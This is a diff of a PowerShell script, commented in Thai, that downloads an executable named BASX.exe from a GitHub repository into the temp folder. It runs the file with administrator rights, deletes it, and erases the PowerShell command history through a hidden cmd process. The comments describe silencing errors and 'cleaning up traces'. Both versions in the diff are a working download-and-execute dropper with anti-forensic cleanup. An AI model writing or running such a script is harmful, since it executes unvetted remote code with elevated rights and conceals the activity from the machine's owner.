@@ -1,35 +1,25 @@
-# ปิดการแจ้งเตือน Error ทุกชนิด (กันตัวแดงโผล่)
+# ปิด ErrorAction เพื่อไม่ให้มีตัวแดงเด้งกวนใจ
 $ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
 
 # 1. ตั้งค่าไฟล์
 $url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
 $output = "$env:TEMP\BASX.exe"
 
-# 2. พยายามโหลดไฟล์ (ถ้าโหลดไม่ได้ให้เงียบไว้)
-try {
-    # ใช้ WebClient เพราะเสถียรกว่า Invoke-WebRequest ในเครื่องที่เน็ตไม่นิ่ง
-    (New-Object System.Net.WebClient).DownloadFile($url, $output)
-} catch {
-    # แผนสำรองถ้าวิธีแรกพลาด
-    Invoke-WebRequest -Uri $url -OutFile $output
-}
+# 2. ดาวน์โหลดไฟล์ (ใช้ WebClient เพื่อความเสถียรสูงสุด)
+(New-Object System.Net.WebClient).DownloadFile($url, $output)
 
-# 3. เช็คว่าไฟล์มาจริงมั้ยก่อนรัน (กัน Error "File Not Found")
+# 3. เช็คว่ามีไฟล์อยู่จริงแล้วถึงค่อยสั่งรัน
 if (Test-Path $output) {
-    # รันแบบ Admin และรอจนกว่าจะปิด
+    # รันแบบ Admin และสั่งให้ PowerShell "รอ" จนกว่าไฟล์จะถูกเรียกสำเร็จ
     Start-Process -FilePath $output -Verb RunAs -Wait
     
-    # พอปิดโปรแกรมปุ๊บ ลบไฟล์ทิ้งทันที
+    # 4. พอดับปุ๊บ ล้างร่องรอยทันที
     Remove-Item -Path $output -Force
+    
+    # ลบประวัติการพิมพ์ (สั่งลาผ่าน CMD เพื่อไม่ให้ติดล็อคไฟล์)
+    $history = (Get-PSReadlineOption).HistorySavePath
+    Start-Process cmd -ArgumentList "/c timeout /t 2 && del /f /q `"$history`"" -WindowStyle Hidden
 }
 
-# 4. ล้างประวัติ PowerShell (ใช้เทคนิค CMD สั่งลาเพื่อให้ลบได้ชัวร์)
-try {
-    $historyPath = (Get-PSReadlineOption).HistorySavePath
-    $cleanup = "timeout /t 2 && del /f /q `"$historyPath`""
-    Start-Process cmd -ArgumentList "/c $cleanup" -WindowStyle Hidden
-} catch {}
-
-# 5. ปิด PowerShell ทันที
+# ปิด PowerShell
 exit
